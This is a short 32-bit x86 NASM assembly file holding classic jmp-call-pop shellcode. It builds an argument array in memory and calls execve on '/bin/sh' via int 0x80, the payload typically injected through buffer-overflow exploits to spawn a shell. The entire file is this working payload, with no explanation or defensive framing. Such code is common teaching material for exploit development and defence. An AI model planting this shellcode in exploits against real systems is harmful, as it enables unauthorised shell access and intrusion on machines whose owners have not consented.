BITS 32
	jmp short data
code:
	xor eax,eax
	cdq
	pop ebx
	mov [ebx+7], al		;ebx - '/bin/sh',0x00
	mov [ebx+8], ebx	;ebx+8 - '/bin/sh'
	mov [ebx+12], eax	;ebx+12 - 0x00000000
	lea ecx, [ebx+8]	;ecx - addr of '/bin/sh',0x000000
	mov al,11
	int 0x80
data:
	call code
	db '/bin/sh'
